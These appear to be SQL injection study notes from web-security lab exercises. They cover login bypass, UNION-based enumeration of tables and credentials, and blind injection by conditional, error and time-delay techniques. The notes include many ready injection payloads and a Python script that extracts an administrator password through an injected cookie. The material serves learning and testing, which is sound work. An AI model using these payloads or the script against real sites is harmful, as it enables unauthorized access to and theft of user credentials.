# Retrieving hidden data
### you can modify an SQL query to return additional results.



1. Example

attacked url: https://insecure-website.com/products?category=Gifts

corresponding SQL:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
For unreleased products, presumably released = 0:

SQL injection: https://insecure-website.com/products?category=Gifts'--

corresponding SQL:
```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

2. Example

attacked url: https://insecure-website.com/products?category=Gifts

corresponding SQL:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Display all category (also not listed on website)

SQL injection: https://insecure-website.com/products?category=Gifts'+OR+1=1--

corresponding SQL:
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

---
    
# Subverting application logic
### you can change a query to interfere with the application's logic.

3. Example
When you done a login on a website, the application makes this SQL query to databse to verify is a user with following credentials exists:

attacked url: https://insecure-website.com/login?username=wiener&password=bluecheese

corresponding SQL:
```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

Authenticate as another user (i.e admin):

attacked url: https://insecure-website.com/login?username=admin'--&password=notimportant

corresponding SQL:
```sql
SELECT * FROM users WHERE username = 'admin'--' AND password = 'notimportant'
```
---
# UNION attacks
### you can retrieve data from different database tables.

In cases where the results of an SQL query are returned within the application's responses, an attacker can leverage an SQL injection vulnerability to retrieve data from other tables within the database.
This is done using the UNION keyword, which lets you execute an additional SELECT query and append the results to the original query. 

The UNION keyword lets you execute one or more additional SELECT queries and append the results to the original query. For example:
SELECT a, b FROM table1 UNION SELECT c, d FROM table2

:warning: 
For a UNION query to work, two key requirements must be met:
1. The individual queries must return the same number of columns.
2. The data types in each column must be compatible between the individual queries.

To carry out a SQL injection UNION attack

- How many columns are being returned from the original query?
- Which columns returned from the original query are of a suitable data type to hold the results from the injected query?

#### How many columns are being returned from the original query?

4. Example

The first method involves injecting a series of ORDER BY clauses and incrementing the specified column index until an error occurs. 
For example, assuming the injection point is a quoted string within the WHERE clause of the original query: 

attacked url: https://insecure-website.com/products?unit=bottles

corresponding SQL:
```sql
SELECT ProductID, ProductName, Unit FROM [Products] WHERE Unit LIKE '%bottles%'
```
![image](https://user-images.githubusercontent.com/62257411/205083129-4b7f8a9b-f26f-4a0f-8125-65b1a243bacc.png)

Injecting a series of ``ORDER BY``:

attacked url: https://insecure-website.com/products?unit='+ORDER+BY+1--

corresponding SQL:
```sql
SELECT ProductID, ProductName, Unit FROM [Products] WHERE Unit LIKE '%' ORDER BY 1--%'
```

The column in an ``ORDER BY`` clause can be specified by its index, so you don't need to know the names of any columns. When the specified column index exceeds the number of actual columns in the result set, the database returns an error, such as: 
![image](https://user-images.githubusercontent.com/62257411/205084141-3c0fdf24-ca11-4786-85dd-cd214e899d25.png)



5. Example

The second method involves submitting a series of UNION SELECT payloads specifying a different number of null values: 

attacked url: https://insecure-website.com/products?unit=bottles

corresponding SQL:
```sql
SELECT ProductID, ProductName, Unit FROM [Products] WHERE Unit LIKE '%bottles%'
```

Injecting a series of ``UNION SELECT NULL``:

attacked url: https://insecure-website.com/products?unit='+UNION+SELECT+NULL--

corresponding SQL:
```sql
SELECT ProductID, ProductName, Unit FROM [Products] WHERE Unit LIKE '%' UNION SELECT NULL--%'
```
If the number of nulls does not match the number of columns, the database returns an error, such as: 
![image](https://user-images.githubusercontent.com/62257411/205085091-39ae26cd-bfb7-48da-a59e-ed3786c5f214.png)

Iterating with more NULL values, will find the exact number of columns (equals to the number of NULL in SQL injection!):
![image](https://user-images.githubusercontent.com/62257411/205085846-3a1c807b-9150-4001-b03b-8fc41e9db319.png)

:warning: 


On **Oracle**, every SELECT query must use the FROM keyword and specify a valid table.
There is a built-in table on Oracle called ```dual``` which can be used for this purpose. 
So the injected queries on Oracle would need to look like:
```sql
' UNION SELECT NULL FROM DUAL--
```


#### Which columns returned from the original query are of a suitable data type to hold the results from the injected query?
Having already determined the number of required columns, you can probe each column to test whether it can hold string data by
submitting a series of UNION SELECT payloads that place a string value into each column in turn. 
For example, if the query returns four columns, you would submit: 

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

6. Example

Suppose instead that the query **only returns a single column**.

You can easily retrieve multiple values together within this single column by concatenating the values together, 
ideally including a suitable separator to let you distinguish the combined values. 
For example, on Oracle you could submit the input:
```sql
' UNION SELECT username || '~' || password FROM users--
```

---
# Examining the database
### you can extract information about the version and structure of the database.

7. Example
attacked url: https://insecure-website.com/filter?category=Pets

corresponding SQL:
```sql
SELECT name, description FROM [products] WHERE category='Pets'
```

After guessed the correct number of columns (using previous described techiques),
inject the SQL query about version iterating over different DBMS:

attacked url: https://insecure-website.com/filter?category=Pets'+UNION+SELECT+BANNER,+NULL+FROM+v$version--

corresponding SQL:
```sql
SELECT name, description FROM [products] WHERE category='Pets' UNION SELECT BANNER, NULL FROM v$version--'
```

8. Example: Possible MYSQL database ==> THE SPACE IS FUNDAMENTAL AFTER COMMENT!!

attacked url: https://insecure-website.com/filter?category=Lifestyle

corresponding SQL:
```sql
SELECT name, description FROM [products] WHERE category='Lifestyle'
```

After guessed the correct number of columns and datatype,
inject the SQL query about version iterating over different DBMS:

attacked url: https://insecure-website.com/filter?category=Lifestyle'+UNION+SELECT+'Pwned',+%40%40version--+ :warning: the last space (+) is **fundamental!!!**

corresponding SQL:
```sql
SELECT name, description FROM [products] WHERE category='Lifestyle' UNION SELECT 'Pwned', @@version-- '
```
![image](https://user-images.githubusercontent.com/62257411/205105245-3268a272-074b-4f50-a71c-b380fb09b24a.png)

9. Example: Listing the contents of the database

Most database types (with the notable exception of Oracle) have a set of views called the information schema which provide information about the database. 

attacked url: https://insecure-website.com/filter?category=Lifestyle

corresponding SQL:
```sql
SELECT name, description FROM [products] WHERE category='Lifestyle'
```
After guessed the DBMS version, correct number of columns and datatype (using previous described techiques), inject the ```UNION```
to get informations from information_schema.tables:

attacked url: https://insecure-website.com/filter?category=Lifestyle'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--

corresponding SQL:
```sql
SELECT name, description FROM [products] WHERE category='Lifestyle' UNION SELECT table_name, NULL FROM information_schema.tables--'
```

Find the name of the table containing user credentials...

Retrieve the details of the columns in the table: 
attacked url: https://insecure-website.com/filter?category=Lifestyle'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--

![image](https://user-images.githubusercontent.com/62257411/205120829-28d8d1f2-a2d3-48e9-b825-49f99bfb3327.png)

attacked url: https://insecure-website.com/filter?category=Lifestyle'/filter?category=Lifestyle'+UNION+SELECT+username_ftqqxw,+password_fnwhov+FROM+users_duefzp--+

corresponding SQL:
```sql
SELECT name, description FROM [products] WHERE category='Lifestyle' UNION SELECT username_ftqqxw, password_fnwhov FROM users_duefzp--' 
```

![image](https://user-images.githubusercontent.com/62257411/205121234-c783e9e9-fae0-4a11-bdc7-bfb3fb96bbdc.png)

---
# Blind SQL injection
### The results of a query you control are not returned in the application's responses.

#### Blind SQL Injection with conditional responses

10. Example: COOKIE!

attacked url: https://insecure-website.com/
Cookie: TrackingId=IvZwI1SeHiIuZVYC

legitimate SQL:
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'IvZwI1SeHiIuZVYC'
```

Show "Welcome back!" in the response page
![image](https://user-images.githubusercontent.com/62257411/205669037-bed4561c-be59-4693-8bd7-236e1abf8362.png)

injected Cookie: 
```TrackingId=IvZwI1SeHiIuZVYC' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'a <-- without ending quote!!```

injected SQL to iterate over an alphabet:
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'IvZwI1SeHiIuZVYC' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'a'
```
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'IvZwI1SeHiIuZVYC' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'b'
```
...

```python
import requests
import string

sql_substring_pos = 1 #starts from 1
charset = string.ascii_letters + string.digits
cookie_value="Nqarnrp9sXLVhmcQ"
url = "https://0a88009c03438dffc1526cb3006300bc.web-security-academy.net/"
max_password_len = 255

def main():
        print(f"Charset used: {charset}")
        print(f"URL: {url}")
        print(f"Max password len: {max_password_len}")
        password=""
        for pos in range(1,max_password_len):
                ret = iterate_char(pos)
                if ret == "end":
                        print(f"Length of password is {pos} characters")
                        break
                if ret is not None:
                        password = password + ret
                        print(f"password: {password}", end="")
                        print("\r", end="")
        print(f"Password found: {password}")

def iterate_char(pos):
        for char in charset:
                payload = f"{cookie_value}' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'),{pos}, 1) = '{char}"
                #print(payload) #DEBUG
                response = requests.get(url, cookies={"TrackingId":payload})
                if "Welcome back!" in response.text:
                        return char
        return "end"
        #if here all the char was tryed so the len password is equal to current pos and we've found it!

if __name__ == '__main__':
        main()
```

#### Inducing conditional responses by triggering SQL errors
Very often, an unhandled error thrown by the database will cause some difference in the application's response (such as an error message), allowing us to infer the truth of the injected condition. 

```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```
With the first input, due to false expression (1=2), the ```CASE``` evaluates to 'a' and does not cause any error.
With the second input, it evaluates to ```1/0```, which causes a divide-by-zero error.
We can infer when the injected condition is true.


11. Example: COOKIE!

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'IvZwI1SeHiIuZVYC'
```

Modify the cookie and test error
```
TrackingId=IvZwI1SeHiIuZVYC'
```
Add the final quote ```'``` to force an error.

injected SQL:
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'IvZwI1SeHiIuZVYC''
```

![image](https://user-images.githubusercontent.com/62257411/206874930-89ae75f3-e80d-4b44-9b83-ded0b9d71e62.png)

After identified the SQL injection and DBMS used (trying different syntax), force an error when a new character of 
administrator user is found by checking the returner error from server:

injected SQL:
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'OjsGA0JunQxfjQAu' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'a') THEN TO_CHAR(1/0) ELSE '1' END FROM dual)='a
```

#### Triggering time delays

Because SQL queries are generally processed synchronously by the application, delaying the execution of an SQL query 
will also delay the HTTP response. This allows us to infer the truth of the injected condition based on the time taken 
before the HTTP response is received:

12. Example: COOKIE!

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'IvZwI1SeHiIuZVYC'
```

injected SQL:
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'IvZwI1SeHiIuZVYC' || pg_sleep(10)--'
```

Conditional time delays:

Sleep for 3 seconds if condition is true.

Injected SQL:
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'NlXHP0045Nz9tiPm'; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END--'
```


